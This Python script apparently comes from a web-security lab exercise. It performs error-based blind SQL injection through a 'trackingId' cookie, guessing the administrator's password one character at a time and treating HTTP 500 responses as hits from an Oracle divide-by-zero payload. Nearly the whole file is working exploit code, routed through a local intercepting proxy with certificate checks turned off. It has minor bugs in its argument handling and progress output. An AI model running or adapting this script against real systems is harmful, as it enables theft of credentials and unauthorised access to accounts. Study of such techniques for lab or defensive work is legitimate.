import requests
import sys  
import urllib3
import urllib
from bs4 import BeautifulSoup
import re   
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted =""
    for i in range(1, 21):  # assuming the password length is 20
        for j in range(32, 126):  # printable ASCII characters
            sqli_payload ="' ||(select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,%s,1) ='%s')||'" % (i,j)  
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)   
            cookie = {'trackingId': 'qmzMr5t7QPb6LAwF'+sqli_payload_encoded, 'session': 'YXXj1t1ClIPA8V4kXHyOk7JxmoY1rVBX'}  # put the cookies according to the URL
            r =  requests.get(url, cookies=cookie, proxies=proxies, verify=False)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r[+] Extracting password: ' + password_extracted + chr(j))
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r[+] Extracting password: ' + password_extracted + chr(j))
                sys.stdout.flush()
def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://example.com '1=1'" % sys.argv[0])
        
    url = sys.argv[1].strip() #we take the URL from command line arguments
    print("[+] retrievin admin password...")
    sqli_password(url)
